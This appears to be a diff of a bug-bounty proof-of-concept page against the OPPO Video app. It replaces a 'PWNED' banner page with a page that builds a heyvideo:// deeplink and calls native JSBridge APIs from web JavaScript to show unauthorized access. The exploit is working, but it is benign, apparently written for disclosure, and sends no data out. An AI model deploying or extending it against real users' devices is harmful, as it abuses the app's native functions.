@@ -1,178 +1,138 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC | BBP/VDP by Radit</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
-        
-        body {
-            background-color: #0a0a0f;
-            color: #00f0ff;
-            font-family: 'JetBrains Mono', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            /* Grid Background */
-            background-image: 
-                linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 240, 255, 0.05) 1px, transparent 1px);
-            background-size: 30px 30px;
-        }
-        
-        .container {
-            background: rgba(19, 19, 31, 0.85);
-            padding: 50px;
-            border: 1px solid #00f0ff;
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2), inset 0 0 20px rgba(0, 240, 255, 0.1);
-            border-radius: 12px;
-            text-align: center;
-            position: relative;
-            backdrop-filter: blur(8px);
-            max-width: 600px;
-            width: 90%;
-        }
-        
-        /* Glowing Animated Border */
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -2px; left: -2px; right: -2px; bottom: -2px;
-            background: linear-gradient(45deg, #00f0ff, #ff0055, #00ff88, #00f0ff);
-            z-index: -1;
-            filter: blur(15px);
-            opacity: 0.6;
-            border-radius: 14px;
-            background-size: 400%;
-            animation: glowing 15s linear infinite;
-        }
-        
-        @keyframes glowing {
-            0% { background-position: 0 0; }
-            50% { background-position: 400% 0; }
-            100% { background-position: 0 0; }
-        }
-
-        .title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin: 0 0 10px 0;
-            color: #ff0055;
-            text-shadow: 0 0 15px rgba(255, 0, 85, 0.6);
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-
-        .hacker-name {
-            font-size: 1.5rem;
-            color: #00f0ff;
-            margin-bottom: 30px;
-            text-shadow: 0 0 8px rgba(0, 240, 255, 0.5);
-        }
-
-        .typing-container {
-            display: inline-block;
-            margin-bottom: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px 20px;
-            border-radius: 6px;
-            border-left: 3px solid #00ff88;
-        }
-
-        .typing-text {
-            overflow: hidden;
-            border-right: .15em solid #00f0ff;
-            white-space: nowrap;
-            margin: 0 auto;
-            letter-spacing: .05em;
-            color: #e2e8f0;
-            font-size: 1.1rem;
-            animation: 
-                typing 3.5s steps(40, end),
-                blink-caret .75s step-end infinite;
-        }
-
-        @keyframes typing {
-            from { width: 0 }
-            to { width: 100% }
-        }
-
-        @keyframes blink-caret {
-            from, to { border-color: transparent }
-            50% { border-color: #00f0ff; }
-        }
-        
-        /* Contact Email Style */
-        .contact-box {
-            margin-bottom: 30px;
-        }
-        
-        .email-link {
-            display: inline-block;
-            color: #00f0ff;
-            text-decoration: none;
-            font-size: 0.95rem;
-            padding: 8px 16px;
-            border: 1px dashed rgba(0, 240, 255, 0.5);
-            border-radius: 4px;
-            transition: all 0.3s ease;
-            background: rgba(0, 240, 255, 0.05);
-        }
-        
-        .email-link:hover {
-            color: #00ff88;
-            border-color: #00ff88;
-            background: rgba(0, 255, 136, 0.1);
-            text-shadow: 0 0 8px rgba(0, 255, 136, 0.5);
-            transform: translateY(-2px);
-        }
-
-        .footer-status {
-            font-size: 0.9rem;
-            color: #718096;
-            display: flex;
-            justify-content: space-between;
-            border-top: 1px dashed rgba(0, 240, 255, 0.3);
-            padding-top: 20px;
-            font-weight: bold;
-        }
-        
-        .blink-red {
-            color: #ff0055;
-            text-shadow: 0 0 5px rgba(255, 0, 85, 0.5);
-            animation: blinker 1.5s linear infinite;
-        }
-        
-        @keyframes blinker {
-            50% { opacity: 0; }
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>OPPO Video h5_detail JSBridge PoC - Radit</title>
+  <style>
+    :root { color-scheme: light dark; font-family: system-ui, -apple-system, Segoe UI, sans-serif; }
+    body { margin: 0; padding: 24px; background: #0b1020; color: #eef2ff; }
+    main { max-width: 860px; margin: auto; }
+    .card { background: #151b32; border: 1px solid #29314f; border-radius: 18px; padding: 20px; margin: 14px 0; box-shadow: 0 14px 40px #0004; }
+    h1 { margin: 0 0 8px; font-size: 26px; }
+    h2 { margin: 0 0 10px; font-size: 18px; }
+    code, pre { background: #070b16; border: 1px solid #27304d; border-radius: 10px; }
+    code { padding: 2px 6px; }
+    pre { padding: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; }
+    button { cursor: pointer; border: 0; border-radius: 12px; padding: 12px 14px; margin: 6px 6px 6px 0; font-weight: 700; background: #7c3aed; color: white; }
+    button.secondary { background: #334155; }
+    .ok { color: #86efac; }
+    .bad { color: #fca5a5; }
+    .muted { color: #a5b4fc; }
+    .warn { color: #fde68a; }
+    #log { min-height: 220px; font-size: 13px; }
+    a { color: #93c5fd; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1 class="title">POC BBP/VDP by</h1>
-        <div class="hacker-name">
-            by <strong>Radit Restu Juniarko</strong>
-        </div>
-        
-        <div class="typing-container">
-            <div class="typing-text">> Vulnerability confirmed.</div>
-        </div>
-        
-        <div class="contact-box">
-            <a href="mailto:radit.restu.juniarko12@gmail.com" class="email-link">
-                [ Contact Security Researcher ]
-            </a>
-        </div>
-        
-        <div class="footer-status">
-            <span>Status: <span class="blink-red">PWNED</span></span>
-            <span>Proof of Concept</span>
-        </div>
-    </div>
+<main>
+  <div class="card">
+    <h1>OPPO Video JSBridge PoC</h1>
+    <p class="muted">Harmless proof-of-concept by Radit. This page does not collect, upload, or exfiltrate user data.</p>
+    <p>Expected attack surface:</p>
+    <pre>heyvideo://global/h5_detail?url=&lt;URL_ENCODED_THIS_PAGE&gt;</pre>
+  </div>
+
+  <div class="card">
+    <h2>Status</h2>
+    <p>Current URL: <code id="currentUrl"></code></p>
+    <p>User-Agent: <code id="ua"></code></p>
+    <p>Bridge present: <b id="bridgeStatus" class="warn">checking...</b></p>
+    <button onclick="runAll()">Run harmless PoC tests</button>
+    <button class="secondary" onclick="makeDeeplink()">Generate heyvideo deeplink</button>
+  </div>
+
+  <div class="card">
+    <h2>Generated deeplink</h2>
+    <p class="muted">After deploying this file, open your GitHub Pages URL in browser first, then click generate.</p>
+    <pre id="deeplink">Not generated yet.</pre>
+  </div>
+
+  <div class="card">
+    <h2>Test log</h2>
+    <pre id="log"></pre>
+  </div>
+</main>
+
+<script>
+const POC_KEY = 'radit_h1_poc_key';
+const POC_VALUE = 'radit_h1_poc_value_' + new Date().toISOString();
+const CLIP_TEXT = 'OPPO Video JSBridge harmless PoC by Radit';
+
+function el(id) { return document.getElementById(id); }
+function log(label, data) {
+  const line = `[${new Date().toISOString()}] ${label}: ${typeof data === 'string' ? data : JSON.stringify(data)}`;
+  el('log').textContent += line + '\n';
+  console.log(line);
+}
+
+function bridge() { return window.appJsBridge; }
+
+function callApi(name, args) {
+  return new Promise((resolve) => {
+    try {
+      if (!bridge() || typeof bridge().callApi !== 'function') {
+        const r = { localError: 'window.appJsBridge.callApi is unavailable' };
+        log(name, r);
+        resolve(r);
+        return;
+      }
+      let callbackCalled = false;
+      const ret = bridge().callApi(name, args, (cb) => {
+        callbackCalled = true;
+        log(name + ' callback', cb);
+        resolve(cb);
+      });
+      log(name + ' return', ret);
+      setTimeout(() => {
+        if (!callbackCalled) resolve(ret);
+      }, 700);
+    } catch (e) {
+      const r = { exception: String(e), stack: e && e.stack };
+      log(name + ' exception', r);
+      resolve(r);
+    }
+  });
+}
+
+async function runAll() {
+  el('log').textContent = '';
+  updateStatus();
+  log('PoC', 'Starting harmless tests. No data is sent anywhere.');
+  log('bridge keys', bridge() ? Object.keys(bridge()) : []);
+
+  await callApi('setValueFromMMKV', { mmkvKey: POC_KEY, mmkvValue: POC_VALUE });
+  await callApi('getValueFromMMKV', { mmkvKey: POC_KEY });
+  await callApi('copyText', CLIP_TEXT);
+
+  // Negative controls: these should usually return 404 in h5_detail context.
+  await callApi('getOpenId', {});
+  await callApi('getGaid', {});
+
+  log('done', 'If set/get MMKV and copyText return code 0, arbitrary webpage JS can invoke selected native APIs inside OPPO Video WebView.');
+}
+
+function makeDeeplink() {
+  const pageUrl = location.href;
+  const deeplink = 'heyvideo://global/h5_detail?url=' + encodeURIComponent(pageUrl + (pageUrl.includes('?') ? '&' : '?') + 'notDarkMode=true');
+  el('deeplink').textContent = deeplink;
+  navigator.clipboard?.writeText(deeplink).then(() => log('deeplink', 'Copied to browser clipboard')).catch(() => {});
+}
+
+function updateStatus() {
+  el('currentUrl').textContent = location.href;
+  el('ua').textContent = navigator.userAgent;
+  const ok = !!bridge();
+  el('bridgeStatus').textContent = ok ? 'YES - window.appJsBridge exists' : 'NO - open through heyvideo deeplink inside OPPO Video';
+  el('bridgeStatus').className = ok ? 'ok' : 'bad';
+}
+
+window.addEventListener('JsBridgeReady', () => {
+  updateStatus();
+  log('event', 'JsBridgeReady fired');
+});
+setInterval(updateStatus, 1000);
+updateStatus();
+</script>
 </body>
 </html>
